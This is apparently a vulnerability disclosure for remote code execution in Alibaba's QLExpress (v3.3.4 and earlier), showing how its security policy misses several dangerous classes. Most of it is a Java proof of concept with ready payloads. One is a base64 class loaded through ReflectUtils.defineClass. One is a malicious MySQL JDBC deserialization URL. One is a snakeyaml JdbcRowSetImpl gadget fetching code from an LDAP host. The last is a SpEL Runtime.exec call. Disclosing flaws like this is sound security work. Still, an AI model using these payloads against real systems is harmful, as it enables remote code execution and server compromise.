# QLExpress remote code execution (≤ v3.3.4)

**Product**: QLExpress

**Affected Versions**: ≤ v3.3.4

**address**: https://github.com/alibaba/QLExpress

## Vulnerability Description

QLExpress 3.3.4 and earlier versions do not restrict calls to `SpelExpressionParser` objects, `DriverManager.getConnection` methods, `ReflectUtils.defineClass` methods, and `snakeyaml` classes, etc. These can all lead to remote code execution.

## Code

As you can see, QLExpress restricts many classes or methods that could potentially cause harm, but it always misses a few.
<img width="1087" height="637" alt="image" src="https://github.com/user-attachments/assets/1ecf909f-ffec-4200-973f-6b02b9627b28" />

Below is the code I used for testing with security policy enabled.
```java
public static void main(String[] args) throws Exception {
        QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);
        ExpressRunner runner = new ExpressRunner();
        DefaultContext<String, Object> ctx = new DefaultContext<>();
        //bytecode loading(Not suitable for jdk high version)
        //Object obj = runner.execute("import org.springframework.cglib.core.ReflectUtils;import javax.xml.bind.DatatypeConverter;byte[] bytes = DatatypeConverter.parseBase64Binary(\"yv66vgAAADQAIQoACAASCAATCgAUABUKABQAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAFwEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAkACgEABGNhbGMHABsMABwAHQwAHgAfAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAIAAKAQAXQnl0ZXNDb2RlR2VuZXJhdG9yL0V4ZWMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAUACAANAAoAAQALAAAAVQACAAEAAAAUEgJLuAADKrYABFenAAhLKrYABrEAAQAAAAsADgAFAAIADAAAABoABgAAAAgAAwAJAAsADAAOAAoADwALABMADQAOAAAABwACTgcADwQAAQAQAAAAAgAR\");ReflectUtils.defineClass(\"BytesCodeGenerator.Exec\", bytes, Thread.currentThread().getContextClassLoader());", ctx, null, true, false);
        //jdbc deserialization
        //Object obj = runner.execute("import java.sql.DriverManager;DriverManager.getConnection(\"jdbc:mysql://x.x.x.x/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=df3fde8\");", ctx, null, true, false);
        //snakeyaml deserialization
        //Object obj = runner.execute("new org.yaml.snakeyaml.Yaml().load(\"!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://x.x.x.x/exp', autoCommit: true}\")", ctx, null, true, false);
        //spel expression execution
        //Object obj = runner.execute("new org.springframework.expression.spel.standard.SpelExpressionParser().parseExpression(\"T(java.lang.Runtime).getRuntime().exec('calc')\").getValue();", ctx, null, true, false);
        System.out.println(obj.toString());
    }
```

Spel expression execution
<img width="1820" height="788" alt="image" src="https://github.com/user-attachments/assets/d0ac8f55-237d-42a6-b12d-0d43dc5f0501" />

